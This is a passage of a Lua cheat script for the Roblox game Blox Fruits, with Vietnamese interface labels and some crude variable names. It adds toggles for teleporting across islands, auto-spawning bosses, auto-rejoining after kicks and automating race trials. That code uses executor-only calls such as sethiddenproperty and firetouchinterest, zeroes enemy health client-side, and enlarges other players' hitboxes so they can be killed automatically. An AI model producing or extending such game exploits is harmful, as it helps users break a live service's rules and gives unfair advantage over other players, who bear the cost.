												until _G.Katakuri_V2_Nhu_lon == false or v.Humanoid.Health <= 0 or not v.Parent or game.Players.LocalPlayer.Backpack:FindFirstChild("God's Chalice") or game.Players.LocalPlayer.Character:FindFirstChild("God's Chalice")
											end
										end
									end
								else
									if game:GetService("ReplicatedStorage"):FindFirstChild("Diablo") then
										topos(game:GetService("ReplicatedStorage"):FindFirstChild("Diablo").HumanoidRootPart.CFrame * CFrame.new(2,20,2))
									elseif game:GetService("ReplicatedStorage"):FindFirstChild("Deandre") then
										topos(game:GetService("ReplicatedStorage"):FindFirstChild("Deandre").HumanoidRootPart.CFrame * CFrame.new(2,20,2))
									elseif game:GetService("ReplicatedStorage"):FindFirstChild("Urban") then
										topos(game:GetService("ReplicatedStorage"):FindFirstChild("Urban").HumanoidRootPart.CFrame * CFrame.new(2,20,2))
									end
								end                    
							end
						else
							wait(0.5)
							game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("EliteHunter")
						end
					end
				end)
			end
		end
	end)    	
---Ok
Tabs.Tele:AddButton({
    Title = "Teleport Sea 1",
    Description = "faster teleport to old world with 1 click",
    Callback = function()            
game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TravelMain")
    end
})

Tabs.Tele:AddButton({
    Title = "Teleport Sea 2",
    Description = "faster teleport to new world with 1 click",
    Callback = function()            
game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TravelDressrosa")
    end
})
Tabs.Tele:AddButton({
    Title = "Teleport Sea 3",
    Description = "faster teleport to third world with 1 click",
    Callback = function()            
game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TravelZou")
    end
})
    
local Mastery = Tabs.Tele:AddSection("Dịch Chuyển Đảo")

if World1 then
local Dropdown1 = Tabs.Tele:AddDropdown("DropdownFarm", {
    Title = "Chọn Đảo | Sea 1",
    Values = {"WindMill", "Marine","Middle Town", "Jungle", "Pirates Village", "Desert", "Snow Island", "MarineFord", "Colosseum", "Sky Island 1", "Sky Island 2", "Sky Island 3", "Prison", "Magma Village", "Under Water Island","Fountain City", "Shank Room"},
    Multi = false,
})

Dropdown1:SetValue("Marine")
Dropdown1:OnChanged(function(Value)
_G.SelectIsland = Value
end)
end

if World2 then
local Dropdown2 = Tabs.Tele:AddDropdown("DropdownFarm", {
    Title = "Chọn Đảo | Sea 2",
    Values = {"The Cafe", "Frist Spot", "Dark Area", "Flamingo Mansion", "Flamingo Room", "Green Zone", "Factory", "Colossuim", "Zombie Island", "Two Snow Mountain", "Punk Hazard", "Cursed Ship", "Ice Castle", "Forgotten Island", "Ussop Island"},
    Multi = false,
})

Dropdown2:SetValue("The Cafe")
Dropdown2:OnChanged(function(Value)
_G.SelectIsland = Value
end)
end

if World3 then
local Dropdown3 = Tabs.Tele:AddDropdown("DropdownFarm3", {
    Title = "Chọn Đảo | Sea 3",
    Values = {"Mansion","Port Town","Great Tree","Castle On The Sea","Hydra Island","Haunted Castle","Ice Cream Island","Peanut Island","Cake Island","Cocoa Island","Candy Island","Tiki Outpost"},
    Multi = false,
})

Dropdown3:SetValue("Mansion")
Dropdown3:OnChanged(function(Value)
_G.SelectIsland = Value
end)
end

local Toggle = Tabs.Tele:AddToggle("Dịch Chuyển Đến Đảo", { Title = "Dịch Chuyển Đến Đảo", Default = false })
Toggle:OnChanged(function(Value)
    _G.BayDao = Value     
         if _G.BayDao == true then
            repeat wait()
                if _G.SelectIsland == "WindMill" then
                    topos(CFrame.new(979.79895019531, 16.516613006592, 1429.0466308594))
                elseif _G.SelectIsland == "Marine" then
                    topos(CFrame.new(-2566.4296875, 6.8556680679321, 2045.2561035156))
                elseif _G.SelectIsland == "Middle Town" then
                    topos(CFrame.new(-690.33081054688, 15.09425163269, 1582.2380371094))
                elseif _G.SelectIsland == "Jungle" then
                    topos(CFrame.new(-1612.7957763672, 36.852081298828, 149.12843322754))
                elseif _G.SelectIsland == "Pirate Village" then
                    topos(CFrame.new(-1181.3093261719, 4.7514905929565, 3803.5456542969))
                elseif _G.SelectIsland == "Desert" then
                    topos(CFrame.new(944.15789794922, 20.919729232788, 4373.3002929688))
                elseif _G.SelectIsland == "Snow Island" then
                    topos(CFrame.new(1347.8067626953, 104.66806030273, -1319.7370605469))
                elseif _G.SelectIsland == "MarineFord" then
                    topos(CFrame.new(-4914.8212890625, 50.963626861572, 4281.0278320313))
                elseif _G.SelectIsland == "Colosseum" then
                    topos( CFrame.new(-1427.6203613281, 7.2881078720093, -2792.7722167969))
                elseif _G.SelectIsland == "Sky Island 1" then
                    topos(CFrame.new(-4869.1025390625, 733.46051025391, -2667.0180664063))
                elseif _G.SelectIsland == "Sky Island 2" then  
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(-4607.82275, 872.54248, -1667.55688))
                elseif _G.SelectIsland == "Sky Island 3" then
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(-7894.6176757813, 5547.1416015625, -380.29119873047))
                elseif _G.SelectIsland == "Prison" then
                    topos( CFrame.new(4875.330078125, 5.6519818305969, 734.85021972656))
                elseif _G.SelectIsland == "Magma Village" then
                    topos(CFrame.new(-5247.7163085938, 12.883934020996, 8504.96875))
                elseif _G.SelectIsland == "Under Water Island" then
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(61163.8515625, 11.6796875, 1819.7841796875))
                elseif _G.SelectIsland == "Fountain City" then
                    topos(CFrame.new(5127.1284179688, 59.501365661621, 4105.4458007813))
                elseif _G.SelectIsland == "Shank Room" then
                    topos(CFrame.new(-1442.16553, 29.8788261, -28.3547478))
                elseif _G.SelectIsland == "Mob Island" then
                    topos(CFrame.new(-2850.20068, 7.39224768, 5354.99268))
                elseif _G.SelectIsland == "The Cafe" then
                    topos(CFrame.new(-380.47927856445, 77.220390319824, 255.82550048828))
                elseif _G.SelectIsland == "Frist Spot" then
                    topos(CFrame.new(-11.311455726624, 29.276733398438, 2771.5224609375))
                elseif _G.SelectIsland == "Dark Area" then
                    topos(CFrame.new(3780.0302734375, 22.652164459229, -3498.5859375))
                elseif _G.SelectIsland == "Flamingo Mansion" then
                    topos(CFrame.new(-483.73370361328, 332.0383605957, 595.32708740234))
                elseif _G.SelectIsland == "Flamingo Room" then
                    topos(CFrame.new(2284.4140625, 15.152037620544, 875.72534179688))
                elseif _G.SelectIsland == "Green Zone" then
                    topos( CFrame.new(-2448.5300292969, 73.016105651855, -3210.6306152344))
                elseif _G.SelectIsland == "Factory" then
                    topos(CFrame.new(424.12698364258, 211.16171264648, -427.54049682617))
                elseif _G.SelectIsland == "Colossuim" then
                    topos( CFrame.new(-1503.6224365234, 219.7956237793, 1369.3101806641))
                elseif _G.SelectIsland == "Zombie Island" then
                    topos(CFrame.new(-5622.033203125, 492.19604492188, -781.78552246094))
                elseif _G.SelectIsland == "Two Snow Mountain" then
                    topos(CFrame.new(753.14288330078, 408.23559570313, -5274.6147460938))
                elseif _G.SelectIsland == "Punk Hazard" then
                    topos(CFrame.new(-6127.654296875, 15.951762199402, -5040.2861328125))
                elseif _G.SelectIsland == "Cursed Ship" then
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(923.21252441406, 126.9760055542, 32852.83203125))
                elseif _G.SelectIsland == "Ice Castle" then
                    topos(CFrame.new(6148.4116210938, 294.38687133789, -6741.1166992188))
                elseif _G.SelectIsland == "Forgotten Island" then
                    topos(CFrame.new(-3032.7641601563, 317.89672851563, -10075.373046875))
                elseif _G.SelectIsland == "Ussop Island" then
                    topos(CFrame.new(4816.8618164063, 8.4599885940552, 2863.8195800781))
                elseif _G.SelectIsland == "Mini Sky Island" then
                    topos(CFrame.new(-288.74060058594, 49326.31640625, -35248.59375))
                elseif _G.SelectIsland == "Great Tree" then
                    topos(CFrame.new(2681.2736816406, 1682.8092041016, -7190.9853515625))
                elseif _G.SelectIsland == "Castle On The Sea" then
                    topos(CFrame.new(-4997.34082, 314.541351, -3015.64111))
                elseif _G.SelectIsland == "Port Town" then
                    topos(CFrame.new(-290.7376708984375, 6.729952812194824, 5343.5537109375))
                elseif _G.SelectIsland == "Hydra Island" then
                    topos(CFrame.new(5741.13281, 668.055969, -268.466827))
                elseif _G.SelectIsland == "Mansion" then
                    topos(CFrame.new(-12550.4395, 337.194122, -7485.29004))
                elseif _G.SelectIsland == "Haunted Castle" then
                    topos(CFrame.new(-9515.3720703125, 164.00624084473, 5786.0610351562))
                elseif _G.SelectIsland == "Ice Cream Island" then
                    topos(CFrame.new(-902.56817626953, 79.93204498291, -10988.84765625))
                elseif _G.SelectIsland == "Peanut Island" then
                    topos(CFrame.new(-2062.7475585938, 50.473892211914, -10232.568359375))
                elseif _G.SelectIsland == "Cake Island" then
                    topos(CFrame.new(-1884.7747802734375, 19.327526092529297, -11666.8974609375))
                elseif _G.SelectIsland == "Cocoa Island" then
                    topos(CFrame.new(87.94276428222656, 73.55451202392578, -12319.46484375))
                elseif _G.SelectIsland == "Candy Island" then
                    topos(CFrame.new(-1014.4241943359375, 149.11068725585938, -14555.962890625))
                elseif _G.SelectIsland == "Tiki Outpost" then
                    topos(CFrame.new(-16218.6826, 9.08636189, 445.618408))
                end
            until not _G.BayDao
        end
        StopTween(_G.BayDao)
    end)
    
                  ----------Tab Spawn Boss Katakuri Và Mấy Đồ Linh Tinh-------
local LinhTinh = Tabs.Race:AddSection("Main Setting Config")
local Toggle = Tabs.Race:AddToggle("Turn V4", { Title = "Tự Động Bật V4", Default = false })
Toggle:OnChanged(function(Value)
    RaceNguLon = Value
end)

task.spawn(
    function()
        while task.wait() do
            task.wait()
            if RaceNguLon then
                if
                game.Players.LocalPlayer.Character:FindFirstChild("RaceEnergy") and
                game.Players.LocalPlayer.Character.RaceEnergy.Value >= 1 and
                not game.Players.LocalPlayer.Character.RaceTransformed.Value
                then
                    local be = game:service("VirtualInputManager")
                    be:SendKeyEvent(true, "Y", false, game)
                    task.wait()
                    be:SendKeyEvent(false, "Y", false, game)
                end
            end
        end
    end
)
local Toggle = Tabs.Main:AddToggle("Auto Spawn Boss Kata", { Title = "Auto Spawn Boss Cake Prince", Default = true })
Toggle:OnChanged(function(Value)
    _G.AutoSpawnCP = Value
end)

spawn(function() 
   while wait() do
      if _G.AutoSpawnCP then
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CakePrinceSpawner",true)        
         end
      end
   end) 

local Toggle = Tabs.Race:AddToggle("Walk Water", { Title = "Walk Water", Default = true })
Toggle:OnChanged(function(Value)
    _G.NuocLon = Value
end)

spawn(function()
      while task.wait() do
		pcall(function()
			if _G.NuocLon then
		    	game:GetService("Workspace").Map["WaterBase-Plane"].Size = Vector3.new(1000,112,1000)
					else
				game:GetService("Workspace").Map["WaterBase-Plane"].Size = Vector3.new(1000,80,1000)
					end
				end)
			end
		end)
                          
local Toggle = Tabs.Race:AddToggle("Walk Water", { Title = "Auto Rejoin", Description = "Rejoin When Kick", Default = false })
Toggle:OnChanged(function(Value)
    _G.Rejoin = Value
end)                          
                          
spawn(function()
    while true do wait()
        getgenv().rejoin = game:GetService("CoreGui").RobloxPromptGui.promptOverlay.ChildAdded:Connect(function(Kick)
            if not _G.TP_Ser and _G.Rejoin then
                if Kick.Name == 'ErrorPrompt' and Kick:FindFirstChild('MessageArea') and Kick.MessageArea:FindFirstChild("ErrorFrame") then
                    game:GetService("TeleportService"):Teleport(game.PlaceId)
                    wait(50)
                end
            end
        end)
    end
end)                          

local Toggle = Tabs.Main:AddToggle("RemoveConMe", { Title = "Remove Damege", Description = "Xoá Damege", Default = false })
Toggle:OnChanged(function(UwUOnTop)
   removedame = UwUOnTop
end)

spawn(function()
   while wait() do
      if removedame then
         game:GetService("ReplicatedStorage").Assets.GUI.DamageCounter.Enabled = false
        else
         game:GetService("ReplicatedStorage").Assets.GUI.DamageCounter.Enabled = true
         end
     end
 end)

local Toggle = Tabs.Main:AddToggle("RemoveConMe", { Title = "Remove Notification", Description = "Xoá Thông Báo", Default = false })
Toggle:OnChanged(function(UwUOnTop)
   removenotify = UwUOnTop
end)

spawn(function()
   while wait() do
      if removenotify then
         game.Players.LocalPlayer.PlayerGui.Notifications.Enabled = false
      else
         game.Players.LocalPlayer.PlayerGui.Notifications.Enabled = true
      end
   end
end)


-------Tab Race-----

spawn(function()
    while wait(1) do
        pcall(updateMirageStatus)
    end
end
)

local Toggle = Tabs.Tele:AddToggle("Teleport", { Title = "Teleport Mirage Island", Default = false })
Toggle:OnChanged(function(Value)
    _G.DaoBiLon = Value
    StopTween(_G.DaoBiLon)
end)

spawn(function()
            pcall(function()
                while wait() do
                    if _G.DaoBiLon then
                        if game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then
                            topos(CFrame.new(game:GetService("Workspace").Map.MysticIsland.Center.Position.X,500,game:GetService("Workspace").Map.MysticIsland.Center.Position.Z))
                        end
                    end
                end
            end)
        end)
local Toggle = Tabs.Race:AddToggle("Teleport Gear", { Title = "Lock Moon", Default = false })
Toggle:OnChanged(function(Value)
    _G.TrangNhuCaiLonTao = Value
end)

spawn(function()
    while wait() do
		pcall(function()
			if _G.TrangNhuCaiLonTao then
			    wait(0.1)
				local moonDir = game.Lighting:GetMoonDirection()
                local lookAtPos = game.Workspace.CurrentCamera.CFrame.p + moonDir * 100
                game.Workspace.CurrentCamera.CFrame = CFrame.lookAt(game.Workspace.CurrentCamera.CFrame.p, lookAtPos)
			end
		end)
    end
end)


local Toggle = Tabs.Tele:AddToggle("Teleport Gear", { Title = "Teleport Gear", Default = false })
Toggle:OnChanged(function(Value)
    _G.Luom_Gear = Value
    StopTween(_G.Luom_Gear)
end)

spawn(function()
    pcall(function()
        while wait() do
            if _G.Luom_Gear then
				if game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then
					for i,v in pairs(game:GetService("Workspace").Map.MysticIsland:GetChildren()) do 
						if v:IsA("MeshPart")then 
                            if v.Material == Enum.Material.Neon then  
                                topos(v.CFrame)
                            end
                        end
					end
				end
			end
        end
    end)
end)

local Toggle = Tabs.Tele:AddToggle("Teleport Gear", { Title = "Teleport Advanced Fruit", Default = false })
Toggle:OnChanged(function(Value)
    _G.RaDaoKhi = Value
    StopTween(_G.RaDaoKhi)
end)

spawn(function()
    pcall(function()
        while wait() do
            if _G.RaDaoKhi then
                if game:GetService("Workspace").NPCs:FindFirstChild("Advanced Fruit Dealer") then
                    topos(CFrame.new(game:GetService("Workspace").NPCs["Advanced Fruit Dealer"].HumanoidRootPart.Position))
                end
            end
        end
    end
    )
end
)

function DaoKhiTrenCaoCuaAn()
game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(
        "requestEntrance",
        Vector3.new(28282.5703125, 14896.8505859375, 105.1042709350586)
        )
end

Tabs.Race:AddButton({
    Title = "Teleport To Great Tree",
    Description = "Tween Đến Đảo Cây",
    Callback = function()
    topos(CFrame.new(28603.7305, 14896.5352, 105.38382))
    wait(.4)
    local args = {
    [1] = "RaceV4Progress",
    [2] = "TeleportBack"
}

game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
    end
})

Tabs.Race:AddButton({
    Title = "Teleport Temple",
    Description = "Tween Đến Cổng Temple",
    Callback = function()
       DaoKhiTrenCaoCuaAn()
    end 
})

Tabs.Race:AddButton({
    Title = "Teleport Install Gear",
    Description = "Tween Đến Chỗ Gắn Gear",
    Callback = function()
    topos(CFrame.new(29539.582, 15068.6846, -86.7974472))
    end
})

          Tabs.Race:AddButton({
          Title = "Teleport To Race Door",
          Description = "Tween Đến Cổng Race",
          Callback = function()
	           if game:GetService("Players").LocalPlayer.Data.Race.Value == "Human" then
                topos(CFrame.new(29221.822265625, 14890.9755859375, -205.99114990234375))
				elseif game:GetService("Players").LocalPlayer.Data.Race.Value == "Skypiea" then
                topos(CFrame.new(28960.158203125, 14919.6240234375, 235.03948974609375))
				elseif game:GetService("Players").LocalPlayer.Data.Race.Value == "Fishman" then
                topos(CFrame.new(28231.17578125, 14890.9755859375, -211.64173889160156))
				elseif game:GetService("Players").LocalPlayer.Data.Race.Value == "Cyborg" then
                topos(CFrame.new(28502.681640625, 14895.9755859375, -423.7279357910156))
				elseif game:GetService("Players").LocalPlayer.Data.Race.Value == "Ghoul" then
                topos(CFrame.new(28674.244140625, 14890.6767578125, 445.4310607910156))
				elseif game:GetService("Players").LocalPlayer.Data.Race.Value == "Mink" then
                topos(CFrame.new(29012.341796875, 14890.9755859375, -380.1492614746094))
				end
end
})
 
local Toggle = Tabs.Race:AddToggle("Auto Complete Trial", { Title = "Auto Train-Buy Gear", Default = false })

Toggle:OnChanged(function(Value)
    _G.Race_Ngu = Value
    _G.Quest_Nhu_Cai_Lon = Value
    StopTween(_G.Quest_Nhu_Cai_Lon)
end)

spawn(function()
    pcall(function()
        while wait() do
            if _G.Race_Ngu then
                if game.Players.LocalPlayer.Character.RaceTransformed.Value == true then
                    _G.Quest_Nhu_Cai_Lon = false
                    topos(CFrame.new(-9507.03125, 713.654968, 6186.39453))
                end
            end
        end
    end)
end)
spawn(function()
    while wait() do 
        if _G.Quest_Nhu_Cai_Lon and World3 then
            pcall(function()
  if game:GetService("Workspace").Enemies:FindFirstChild("Reborn Skeleton") or game:GetService("Workspace").Enemies:FindFirstChild("Living Zombie") or game:GetService("Workspace").Enemies:FindFirstChild("Demonic Soul") or game:GetService("Workspace").Enemies:FindFirstChild("Posessed Mummy") then
                        for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                            if v.Name == "Reborn Skeleton" or v.Name == "Living Zombie" or v.Name == "Demonic Soul" or v.Name == "Posessed Mummy" then
                               if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                   repeat wait()
                                        AutoHaki()
                                        EquipWeapon(_G.SelectWeapon)
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Humanoid.WalkSpeed = 0
                                        v.Head.CanCollide = false 
                                        BonesBring = true
                                        topos(v.HumanoidRootPart.CFrame * Pos)
                                        
                                    until not _G.Quest_Nhu_Cai_Lon or not v.Parent or v.Humanoid.Health <= 0
                                end
                            end
                        end
                    else
                    if BypassTP then
                    if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - BonePos.Position).Magnitude > 1500 then
			        BTP(UwU)
				    elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - BonePos.Position).Magnitude < 1500 then
				    topos(UwU)
					end
				else
				    topos(UwU)
				end
				        UnEquipWeapon(_G.SelectWeapon)
                        BonesBring = false
				     	topos(CFrame.new(-9507.03125, 713.654968, 6186.39453))
                        for i,v in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do 
                            if v.Name == "Reborn Skeleton" then
                                topos(v.HumanoidRootPart.CFrame * CFrame.new(2,20,2))
                            elseif v.Name == "Living Zombie" then
                                topos(v.HumanoidRootPart.CFrame * CFrame.new(2,20,2))
                            elseif v.Name == "Demonic Soul" then
                                topos(v.HumanoidRootPart.CFrame * CFrame.new(2,20,2))
                            elseif v.Name == "Posessed Mummy" then
                                topos(v.HumanoidRootPart.CFrame * CFrame.new(2,20,2))
                            end
                        end
                    end
                end
                )
            end
        end
    end
      )
spawn(function()
    pcall(function()
        while wait() do
            if _G.Race_Ngu then
                if game.Players.LocalPlayer.Character.RaceTransformed.Value == false then
                    _G.Quest_Nhu_Cai_Lon = true
                end
            end
        end
    end
    )
end
)
task.spawn(
    function()
        while task.wait() do
            task.wait()
            if _G.Race_Ngu then
                if
                    game.Players.LocalPlayer.Character:FindFirstChild("RaceEnergy") and
                        game.Players.LocalPlayer.Character.RaceEnergy.Value >= 1 and
                        not game.Players.LocalPlayer.Character.RaceTransformed.Value
                 then
                    local be = game:service("VirtualInputManager")
                    be:SendKeyEvent(true, "Y", false, game)
                    task.wait()
                    be:SendKeyEvent(false, "Y", false, game)
                end
            end
        end
    end
)
spawn(
   function()
      pcall(
        function()
           while wait(0.1) do
            if _G.Race_Ngu then
                local args = {
                [1] = true
                }
                local args = {
                    [1] = "UpgradeRace",
                    [2] = "Buy"
                }
                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
            end
        end 
    end
    )
end
)                            
local Toggle = Tabs.Race:AddToggle("Auto Complete Trial", { Title = "Auto Complete Trial", Default = false })

Toggle:OnChanged(function(Value)
    _G.AutoComplete_Race = Value
    StopTween(_G.AutoComplete_Race)
end)

spawn(
    function()
        pcall(
            function()
                while wait() do
                    if _G.AutoComplete_Race then
                        if game:GetService("Players").LocalPlayer.Data.Race.Value == "Human" then
                            for i, v in pairs(game.Workspace.Enemies:GetDescendants()) do
                                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                    pcall(function()
                                        repeat 
                                            task.wait(.1)
                                            v.Humanoid.Health = 0
                                            v.HumanoidRootPart.CanCollide = false
                                            sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
                                        until not _G.AutoComplete_Race or not v.Parent or v.Humanoid.Health <= 0
                                    end
                                    )
                                end
                            end
     elseif game:GetService("Players").LocalPlayer.Data.Race.Value == "Skypiea" then
                            local c1 = game:GetService("Workspace").Map.SkyTrial.Model.FinishPart
                            if (c1.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 2000 then
                                wait(2)
                                topos(c1.CFrame)
                                wait(3)
                            end
                        elseif game:GetService("Players").LocalPlayer.Data.Race.Value == "Fishman" then
                            for i, v in pairs(game:GetService("Workspace").SeaBeasts.SeaBeast1:GetDescendants()) do
                                if v.Name == "HumanoidRootPart" then
                                    topos(v.CFrame* CFrame.new(0, 600, 0))
             for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                                    if v:IsA("Tool") then
									if v.ToolTip == "Melee" then -- "Blox Fruit" , "Sword" , "Wear" , "Agility"
										game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
									end
								end
							end
							game:GetService("VirtualInputManager"):SendKeyEvent(true,122,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
							game:GetService("VirtualInputManager"):SendKeyEvent(false,122,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
							wait(.1)
							game:GetService("VirtualInputManager"):SendKeyEvent(true,120,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
							game:GetService("VirtualInputManager"):SendKeyEvent(false,120,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
							wait(.1)
							game:GetService("VirtualInputManager"):SendKeyEvent(true,99,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
							game:GetService("VirtualInputManager"):SendKeyEvent(false,99,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
							for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
								if v:IsA("Tool") then
									if v.ToolTip == "Blox Fruit" then -- "Blox Fruit" , "Sword" , "Wear" , "Agility"
										game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
									end
								end
							end
							game:GetService("VirtualInputManager"):SendKeyEvent(true,122,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
							game:GetService("VirtualInputManager"):SendKeyEvent(false,122,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
							wait(.2)
							game:GetService("VirtualInputManager"):SendKeyEvent(true,120,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
							game:GetService("VirtualInputManager"):SendKeyEvent(false,120,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
							wait(.2)
							game:GetService("VirtualInputManager"):SendKeyEvent(true,99,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
							game:GetService("VirtualInputManager"):SendKeyEvent(false,99,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
					
							wait(0.5)
							for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
								if v:IsA("Tool") then
									if v.ToolTip == "Sword" then -- "Blox Fruit" , "Sword" , "Wear" , "Agility"
										game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
									end
								end
							end
							game:GetService("VirtualInputManager"):SendKeyEvent(true,122,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
							game:GetService("VirtualInputManager"):SendKeyEvent(false,122,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
							wait(.2)
							game:GetService("VirtualInputManager"):SendKeyEvent(true,120,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
							game:GetService("VirtualInputManager"):SendKeyEvent(false,120,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
							wait(.2)
							game:GetService("VirtualInputManager"):SendKeyEvent(true,99,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
							game:GetService("VirtualInputManager"):SendKeyEvent(false,99,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
							wait(0.5)
							for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
								if v:IsA("Tool") then
									if v.ToolTip == "Gun" then -- "Blox Fruit" , "Sword" , "Wear" , "Agility"
										game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
									end
								end
							end
							game:GetService("VirtualInputManager"):SendKeyEvent(true,122,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
							game:GetService("VirtualInputManager"):SendKeyEvent(false,122,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
							wait(.2)
							game:GetService("VirtualInputManager"):SendKeyEvent(true,120,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
							game:GetService("VirtualInputManager"):SendKeyEvent(false,120,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
							wait(.2)
							game:GetService("VirtualInputManager"):SendKeyEvent(true,99,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
							game:GetService("VirtualInputManager"):SendKeyEvent(false,99,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
						end
					end
       elseif game:GetService("Players").LocalPlayer.Data.Race.Value == "Cyborg" then
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(
                                "requestEntrance",
                                Vector3.new(28282.5703125, 14896.8505859375, 105.1042709350586)
                            )
                        elseif game:GetService("Players").LocalPlayer.Data.Race.Value == "Ghoul" then
                            for i, v in pairs(game.Workspace.Enemies:GetDescendants()) do
                                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                    pcall(function()
                                        repeat 
                                            wait(.1)
                                            v.Humanoid.Health = 0
                                            v.HumanoidRootPart.CanCollide = false
                                            sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
                                        until not _G.AutoComplete_Race or not v.Parent or v.Humanoid.Health <= 0
                                    end
                                    )
                                end
                            end
        elseif game:GetService("Players").LocalPlayer.Data.Race.Value == "Mink" then
                            local c0 = game:GetService("Workspace").StartPoint
                            if (c0.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 500 then
                                topos(c0.CFrame)
                    for i, v in pairs(game:GetService("Workspace"):GetDescendants()) do
                    if v:IsA("TouchInterest") or v.Name == "TouchInterest" then
                    if (v.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 50 then          
                                firetouchinterest(v)
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        )
    end
)
_G.SkillZ = true
_G.SkillX = true
_G.SkillC = true
_G.SkillV = true
spawn(function()
    while wait() do
        pcall(function()
            if UseSkillKub then
                if _G.SkillZ then
                     game:GetService("VirtualInputManager"):SendKeyEvent(true,"Z",false,game)
                     wait(.1)
                     game:GetService("VirtualInputManager"):SendKeyEvent(false,"Z",false,game)
                end
                if _G.SkillX then
                     game:GetService("VirtualInputManager"):SendKeyEvent(true,"X",false,game)
                     wait(.1)
                     game:GetService("VirtualInputManager"):SendKeyEvent(false,"X",false,game)
                end
                if _G.SkillC then                  
                     game:GetService("VirtualInputManager"):SendKeyEvent(true,"C",false,game)
                     wait(.1)
                     game:GetService("VirtualInputManager"):SendKeyEvent(false,"C",false,game)
                end
                if _G.SkillV then
                     game:GetService("VirtualInputManager"):SendKeyEvent(true,"V",false,game)
                     wait(.1)
                     game:GetService("VirtualInputManager"):SendKeyEvent(false,"V",false,game)
                end
            end
        end
        )
    end
end
)
local Toggle = Tabs.Race:AddToggle("Kill Trial", { Title = "Kill Player Trial", Default = false })
Toggle:OnChanged(function(Value)
    _G.Kill_V4 = Value
    AutoActiveRace = Value
    StopTween(_G.Kill_V4)
end)
spawn(
    function()
    while task.wait() do
        if _G.Kill_V4 and World3 then
            pcall(
                function()
    if game:GetService("Players")["LocalPlayer"].PlayerGui.Main.Timer.Visible == true then
                for i, v in pairs(game.Workspace.Characters:GetChildren()) do
                    if v.Name ~= game.Players.LocalPlayer.Name then
                        if v.Humanoid.Health > 0 and v:FindFirstChild("HumanoidRootPart") and v.Parent and (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - v.HumanoidRootPart.Position).Magnitude <= 230 then
                            repeat task.wait()
                                AutoHaki()
                                EquipWeapon(_G.SelectWeapon)
                                UsefastattackPlayers = true
                            topos(v.HumanoidRootPart.CFrame * CFrame.new(1, 1, 2))
                            v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                            if _G.ConCacZ then
           game:GetService("VirtualInputManager"):SendKeyEvent(true,"Z",false,game)
                     wait(.1)
           game:GetService("VirtualInputManager"):SendKeyEvent(false,"Z",false,game)
                                end
                            if _G.ConCacX then
           game:GetService("VirtualInputManager"):SendKeyEvent(true,"X",false,game)
                     wait(.1)
           game:GetService("VirtualInputManager"):SendKeyEvent(false,"X",false,game)
                                end
                            if ConCacC then
           game:GetService("VirtualInputManager"):SendKeyEvent(true,"C",false,game)
                     wait(.1)
